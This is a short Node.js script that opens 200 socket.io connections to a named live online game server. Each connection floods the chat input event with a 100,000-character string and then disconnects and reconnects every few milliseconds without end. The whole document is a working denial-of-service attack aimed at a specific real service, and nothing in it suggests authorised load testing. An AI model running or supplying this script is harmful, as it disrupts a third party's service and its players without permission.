const io = require("socket.io-client");

const servers = ["https://na-3.swordonline.io"];

const clientsPerServer = Math.floor(200 / servers.length);

servers.forEach((server, idx) => {
  for (let i = 0; i < clientsPerServer; i++) {
    const clientIndex = idx * clientsPerServer + i;

    setTimeout(() => {
      const socket = io(server);

      socket.on("connect", () => {
        socket.emit("keyPressX", {
          inputId: "chatMessage",
          state: "a".repeat(100_000),
        });

        setTimeout(() => {
          socket.disconnect();
        }, 1);
      });

      socket.on("disconnect", () => {
        setTimeout(() => {
          socket.connect();
        }, 1);
      });
    }, clientIndex * 50);
  }
});
